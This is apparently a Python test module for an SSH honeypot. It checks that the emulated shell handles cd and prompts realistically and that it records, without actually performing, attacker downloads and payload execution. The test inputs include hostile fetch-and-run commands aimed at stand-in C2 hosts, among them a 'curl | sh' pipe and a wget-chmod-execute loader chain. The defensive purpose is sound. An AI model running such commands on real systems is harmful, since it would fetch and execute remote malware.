"""The emulated shell, as an attacker experiences it.

Two defects here were invisible in every other kind of test, because neither
raised: `cd` accepted any path and changed nothing, and `wget` was answered
with "command not found". A dropper hitting the second one stops one line into
its script, so the payload name, the C2 URL and everything the loader would
have done next are never observed. The honeypot kept running and recorded
nothing worth reading.
"""

import pytest

from honeypot.core.modes import mode_handler
from honeypot.core.session import session_manager
from honeypot.core.shell_state import resolve_path, shell_states


async def run(session_id, command, **overrides):
    """Execute one command the way the SSH emulator does."""
    data = {
        "command": command,
        "username": "root",
        "cwd": shell_states.get(session_id).cwd,
        "is_root": True,
        **overrides,
    }
    output = await mode_handler.handle_interaction(session_id, "ssh", "command", data)
    await session_manager.record_command(session_id, command, output or "", 0)
    return output, data


class TestResolvePath:
    @pytest.mark.parametrize(
        "cwd,arg,expected",
        [
            ("/home/user", "..", "/home"),
            ("/home/user", ".", "/home/user"),
            ("/home/user", "~", "/home/user"),
            ("/home/user", "~/x", "/home/user/x"),
            ("/tmp", "/etc/ssh", "/etc/ssh"),
            ("/tmp", "", "/home/user"),
            ("/", "..", "/"),
            ("/tmp", "'/var/tmp'", "/var/tmp"),
        ],
    )
    def test_paths(self, cwd, arg, expected):
        assert resolve_path(cwd, arg) == expected


class TestWorkingDirectory:
    async def test_cd_actually_moves(self, session):
        await run(session, "cd /tmp")
        output, _ = await run(session, "pwd")
        assert output.strip() == "/tmp"

    async def test_cd_reports_the_change_to_the_caller(self, session):
        """The SSH emulator reads this back to keep its prompt in step."""
        _, data = await run(session, "cd /tmp")
        assert data["cwd_after"] == "/tmp"

    async def test_cd_to_a_missing_directory_fails_like_bash(self, session):
        output, _ = await run(session, "cd /nowhere")
        assert "No such file or directory" in output
        pwd, _ = await run(session, "pwd")
        assert pwd.strip() == "/home/user"

    async def test_relative_movement(self, session):
        await run(session, "cd /tmp")
        await run(session, "cd ..")
        output, _ = await run(session, "pwd")
        assert output.strip() == "/"

    async def test_prompt_abbreviates_home(self, session):
        prompt = await mode_handler.handle_interaction(
            session, "ssh", "prompt",
            {"username": "user", "hostname": "srv01", "is_root": False},
        )
        assert prompt.endswith(":~$ ")

    async def test_prompt_follows_the_directory(self, session):
        await run(session, "cd /tmp")
        prompt = await mode_handler.handle_interaction(
            session, "ssh", "prompt",
            {"username": "user", "hostname": "srv01", "is_root": False},
        )
        assert ":/tmp$" in prompt


class TestRetrieval:
    async def test_wget_is_not_refused(self, session):
        """The regression this whole module exists for."""
        output, _ = await run(session, "wget http://185.220.101.5/bins/mips")
        assert "command not found" not in output
        assert "200 OK" in output

    async def test_the_url_is_recorded_as_an_event(self, session):
        await run(session, "wget http://185.220.101.5/bins/mips -O /tmp/mips")
        record = await session_manager.get_session(session)
        downloads = [
            e for e in record.network_events if e["event_type"] == "file_download"
        ]
        assert len(downloads) == 1
        assert downloads[0]["url"] == "http://185.220.101.5/bins/mips"
        assert downloads[0]["host"] == "185.220.101.5"
        assert downloads[0]["filename"] == "mips"

    async def test_nothing_is_actually_fetched(self, session):
        """The honeypot must never make the outbound request it is emulating."""
        await run(session, "wget http://185.220.101.5/bins/mips")
        record = await session_manager.get_session(session)
        assert record.network_events[0]["fetched"] is False

    async def test_a_piped_fetch_is_flagged(self, session):
        await run(session, "curl -s http://evil.tld/i.sh | sh")
        record = await session_manager.get_session(session)
        assert record.network_events[0]["piped_to_shell"] is True

    async def test_a_bare_wget_gets_the_real_usage_error(self, session):
        output, _ = await run(session, "wget")
        assert "missing URL" in output
        assert "command not found" not in output


class TestAttackChain:
    """The sequence a real loader runs, end to end."""

    async def test_fetch_then_list_then_chmod_then_execute(self, session):
        await run(session, "cd /tmp")
        await run(session, "wget http://185.220.101.5/bins/mips -O mips")

        listing, _ = await run(session, "ls -la")
        assert "mips" in listing

        denied, _ = await run(session, "./mips")
        assert "Permission denied" in denied

        await run(session, "chmod +x mips")
        executed, _ = await run(session, "./mips")
        assert executed == ""

        record = await session_manager.get_session(session)
        kinds = [e["event_type"] for e in record.network_events]
        assert kinds == ["file_download", "payload_execution"]
        assert record.network_events[1]["path"] == "/tmp/mips"
        assert record.network_events[1]["executed"] is False

    async def test_running_something_that_was_never_fetched_fails(self, session):
        output, _ = await run(session, "./nothing")
        assert "No such file or directory" in output

    async def test_the_dropped_file_is_scoped_to_its_directory(self, session):
        await run(session, "cd /tmp")
        await run(session, "wget http://c2.tld/x -O x")
        await run(session, "cd /home/user")
        listing, _ = await run(session, "ls")
        assert "x\n" not in listing

    async def test_every_command_is_recorded_with_its_output(self, session):
        """Both call sites used to record a hardcoded empty output."""
        await run(session, "uname -a")
        await run(session, "wget http://c2.tld/x")
        record = await session_manager.get_session(session)
        assert all(c["output"] for c in record.commands)


class TestPayloadTransmission:
    async def test_the_backend_payload_carries_the_evidence(self, session):
        await run(session, "cd /tmp")
        await run(session, "wget http://185.220.101.5/bins/mips -O mips")
        await session_manager.record_auth_attempt(session, "root", "admin123", False)
        await session_manager.record_keystroke(session, "a")

        record = await session_manager.get_session(session)
        payload = record.to_backend_payload(node_id=1)

        assert payload["transcript"][0]["command"] == "cd /tmp"
        assert "200 OK" in payload["transcript"][1]["output"]
        assert payload["credentials"] == [
            {"username": "root", "password": "admin123", "success": False,
             "timestamp": payload["credentials"][0]["timestamp"]}
        ]
        assert payload["keystroke_count"] == 1
        assert payload["events"][0]["url"] == "http://185.220.101.5/bins/mips"
